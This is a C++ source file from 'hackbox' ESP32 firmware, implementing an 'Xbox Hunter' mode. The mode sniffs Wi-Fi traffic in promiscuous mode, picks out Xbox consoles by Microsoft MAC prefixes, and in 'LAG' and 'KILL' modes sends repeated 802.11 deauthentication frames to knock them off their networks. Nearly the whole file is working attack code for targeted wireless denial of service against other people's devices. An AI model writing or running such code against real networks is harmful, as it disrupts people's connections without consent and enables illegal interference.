/*
    hackbox
    hackbox custom firmware
    Copyright (c) 2025 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/xbox_hunter.h"
#include "../include/radio_manager.h"
#include "../include/wifi_utils.h"
#include "../include/pindefs.h"
#include "../include/display_mirror.h"
#include <U8g2lib.h>
#include "esp_wifi.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// Microsoft / Xbox OUI table.
// Source: IEEE registry at https://standards-oui.ieee.org/oui/oui.csv (April 2026)
// Tier A: IEEE-confirmed "Microsoft XCG" (Xbox Core Group) plus short-form
//         "Microsoft" registrants historically used by Xbox / hardware.
// Tier B: "Microsoft Corporation" blocks commonly observed on Xbox consoles
//         in field data but not exclusive to Xbox (lower confidence -> "MS?").
struct XboxOUI {
    uint8_t bytes[3];
    bool tierA;
};

static const XboxOUI XBOX_OUIS[] = {
    { { 0xDC, 0xB4, 0xC4 }, true },  // Microsoft XCG
    { { 0x7C, 0xED, 0x8D }, true },  // Microsoft
    { { 0x30, 0x59, 0xB7 }, true },  // Microsoft
    { { 0x7C, 0x1E, 0x52 }, true },  // Microsoft
    { { 0x58, 0x82, 0xA8 }, true },  // Microsoft
    { { 0xC0, 0x33, 0x5E }, true },  // Microsoft
    { { 0xB4, 0xAE, 0x2B }, true },  // Microsoft
    { { 0x4C, 0x0B, 0xBE }, true },  // Microsoft
    { { 0x50, 0x1A, 0xC5 }, true },  // Microsoft
    { { 0x60, 0x45, 0xBD }, true },  // Microsoft
    { { 0x98, 0x5F, 0xD3 }, false }, // Microsoft Corporation (Tier B)
    { { 0x28, 0x18, 0x78 }, false }, // Microsoft Corporation (Tier B)
};
static const int XBOX_OUI_COUNT = sizeof(XBOX_OUIS) / sizeof(XBOX_OUIS[0]);

static const XboxOUI* findOUI(const uint8_t mac[6]) {
    for (int i = 0; i < XBOX_OUI_COUNT; i++) {
        if (memcmp(mac, XBOX_OUIS[i].bytes, 3) == 0) return &XBOX_OUIS[i];
    }
    return nullptr;
}

bool isXboxOUI(const uint8_t mac[6]) {
    return findOUI(mac) != nullptr;
}

enum XHMode { XH_MONITOR = 0, XH_LAG = 1, XH_KILL = 2 };
static const char* XH_MODE_LABELS[3] = { "MONITOR", "LAG", "KILL" };

#define XH_MAX_CONSOLES 12
struct XboxTarget {
    uint8_t mac[6];
    uint8_t bssid[6];
    uint8_t channel;
    int8_t rssi;
    bool tierA;
    bool hasBssid;
    unsigned long lastDeauthAt;
};

static XboxTarget consoles[XH_MAX_CONSOLES];
static volatile int consoleCount = 0;

static XHMode mode = XH_MONITOR;
static int selection = 0;
static uint8_t sniffChannel = 1;
static unsigned long lastChannelHop = 0;
static const unsigned long CHANNEL_HOP_MS = 350;

static const unsigned long LAG_INTERVAL_MS = 400;
static const unsigned long KILL_INTERVAL_MS = 5;

static bool needsRedraw = true;

// ISR and main loop both touch consoles[]/consoleCount
static portMUX_TYPE xhMux = portMUX_INITIALIZER_UNLOCKED;

static unsigned long lastBtnTime = 0;
static const unsigned long BTN_DEBOUNCE_MS = 180;

static int findConsole(const uint8_t mac[6]) {
    for (int i = 0; i < consoleCount; i++) {
        if (memcmp(consoles[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

static void addOrUpdateConsole(const uint8_t mac[6], const uint8_t bssid[6],
                               bool hasBssid, int8_t rssi, uint8_t channel) {
    portENTER_CRITICAL(&xhMux);
    int idx = findConsole(mac);
    if (idx < 0) {
        if (consoleCount >= XH_MAX_CONSOLES) {
            portEXIT_CRITICAL(&xhMux);
            return;
        }
        idx = consoleCount++;
        memcpy(consoles[idx].mac, mac, 6);
        memset(consoles[idx].bssid, 0, 6);
        consoles[idx].channel = 0;
        consoles[idx].rssi = 0;
        consoles[idx].hasBssid = false;
        consoles[idx].lastDeauthAt = 0;
        const XboxOUI* oui = findOUI(mac);
        consoles[idx].tierA = oui ? oui->tierA : false;
        needsRedraw = true;
    }
    if (hasBssid) {
        memcpy(consoles[idx].bssid, bssid, 6);
        consoles[idx].hasBssid = true;
    }
    consoles[idx].rssi = rssi;
    consoles[idx].channel = channel;
    portEXIT_CRITICAL(&xhMux);
}

static const uint8_t BROADCAST_MAC[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

void IRAM_ATTR xboxHunterSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;

    const uint8_t* frame = pkt->payload;
    uint8_t fc1 = frame[1];
    bool toDS = (fc1 & 0x01) != 0;
    bool fromDS = (fc1 & 0x02) != 0;

    const uint8_t* addr1 = &frame[4];
    const uint8_t* addr2 = &frame[10];

    const uint8_t* staMac = nullptr;
    const uint8_t* bssid = nullptr;
    bool hasBssid = false;

    if (toDS && !fromDS) {
        staMac = addr2;
        bssid = addr1;
        hasBssid = true;
    } else if (!toDS && fromDS) {
        staMac = addr1;
        bssid = addr2;
        hasBssid = true;
    } else {
        return;
    }

    if (memcmp(staMac, BROADCAST_MAC, 6) == 0) return;
    if ((staMac[0] & 0x01) != 0) return;

    if (!isXboxOUI(staMac)) return;

    addOrUpdateConsole(staMac, bssid, hasBssid,
                       pkt->rx_ctrl.rssi, pkt->rx_ctrl.channel);
}

static void hopChannel() {
    sniffChannel++;
    if (sniffChannel > 11) sniffChannel = 1;
    esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
}

static void drawUI() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Xbox Hunter");

    char line[32];
    snprintf(line, sizeof(line), "Mode: %s", XH_MODE_LABELS[mode]);
    u8g2.drawStr(0, 22, line);

    snprintf(line, sizeof(line), "Consoles: %d", consoleCount);
    u8g2.drawStr(0, 34, line);

    if (consoleCount > 0) {
        const XboxTarget& t = consoles[0];
        const char* tag = t.tierA ? "XBOX" : "MS? ";
        snprintf(line, sizeof(line), "%s %02X%02X%02X c%d",
                 tag, t.mac[0], t.mac[1], t.mac[2], t.channel);
        u8g2.drawStr(0, 46, line);
    } else {
        u8g2.drawStr(0, 46, "Scanning 2.4GHz...");
    }

    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 56, "U/D=Mode  R=Set  L=Exit");
    u8g2.drawStr(0, 63, "2.4GHz only (no 5GHz)");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void xboxHunterSetup() {
    initWiFi(WIFI_MODE_APSTA);

    consoleCount = 0;
    mode = XH_MONITOR;
    selection = 0;
    sniffChannel = 1;
    lastChannelHop = 0;
    lastBtnTime = 0;
    needsRedraw = true;

    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(xboxHunterSniffer);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
}

void xboxHunterLoop() {
    unsigned long now = millis();

    if (now - lastChannelHop >= CHANNEL_HOP_MS) {
        lastChannelHop = now;
        hopChannel();
    }

    if (now - lastBtnTime >= BTN_DEBOUNCE_MS) {
        if (digitalRead(BUTTON_PIN_UP) == LOW) {
            selection = (selection + 2) % 3;
            needsRedraw = true;
            lastBtnTime = now;
        } else if (digitalRead(BUTTON_PIN_DOWN) == LOW) {
            selection = (selection + 1) % 3;
            needsRedraw = true;
            lastBtnTime = now;
        } else if (digitalRead(BUTTON_PIN_RIGHT) == LOW) {
            mode = (XHMode)selection;
            needsRedraw = true;
            lastBtnTime = now;
        }
    }

    if (mode == XH_LAG || mode == XH_KILL) {
        unsigned long interval = (mode == XH_LAG) ? LAG_INTERVAL_MS : KILL_INTERVAL_MS;

        portENTER_CRITICAL(&xhMux);
        int count = consoleCount;
        XboxTarget localCopy[XH_MAX_CONSOLES];
        memcpy(localCopy, consoles, sizeof(XboxTarget) * count);
        portEXIT_CRITICAL(&xhMux);

        uint8_t lastCh = 0;
        for (int i = 0; i < count; i++) {
            XboxTarget& t = localCopy[i];
            if (!t.hasBssid) continue;
            if (now - t.lastDeauthAt < interval) continue;

            if (t.channel != lastCh) {
                esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
                lastCh = t.channel;
            }
            sendDeauthFrame(t.mac, t.bssid, t.bssid, 0x0001);
            sendDeauthFrame(t.bssid, t.mac, t.bssid, 0x0001);

            portENTER_CRITICAL(&xhMux);
            consoles[i].lastDeauthAt = now;
            portEXIT_CRITICAL(&xhMux);
        }
        esp_wifi_set_channel(sniffChannel, WIFI_SECOND_CHAN_NONE);
    }

    if (needsRedraw) {
        drawUI();
        needsRedraw = false;
    }
}

void xboxHunterCleanup() {
    esp_wifi_set_promiscuous(false);
    consoleCount = 0;
}
